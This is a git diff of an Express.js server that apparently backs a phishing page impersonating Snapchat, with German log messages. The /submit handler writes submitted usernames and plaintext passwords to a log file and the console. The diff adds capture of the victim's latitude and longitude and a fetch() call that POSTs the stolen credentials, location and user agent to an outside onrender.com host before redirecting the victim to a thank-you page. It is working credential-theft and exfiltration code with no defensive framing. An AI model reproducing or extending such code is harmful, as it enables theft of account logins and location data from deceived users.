@@ -13,23 +13,30 @@ app.use(express.json());
 
 app.post('/submit', async (req, res) => {
   try {
-    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const { username, password } = req.body;
+    const { username, password, latitude, longitude } = req.body;
 
     const logData = {
       timestamp: new Date().toISOString(),
-      ip: clientIp,
       userAgent: req.headers['user-agent'],
-      username: username,
-      password: password
+      username,
+      password,
+      latitude,
+      longitude
     };
 
     fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
       if (err) console.error("Log-Fehler:", err);
     });
 
-    console.log("👤 Benutzername erhalten:", username);
-    console.log("🔑 Passwort erhalten:", password);
+    console.log("👤 Benutzername:", username);
+    console.log("🔑 Passwort:", password);
+    console.log("📍 Standort:", latitude, longitude);
+
+    await fetch('https://snapchat-35f2.onrender.com/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(logData)
+    });
 
     res.redirect('/danke.html');
 
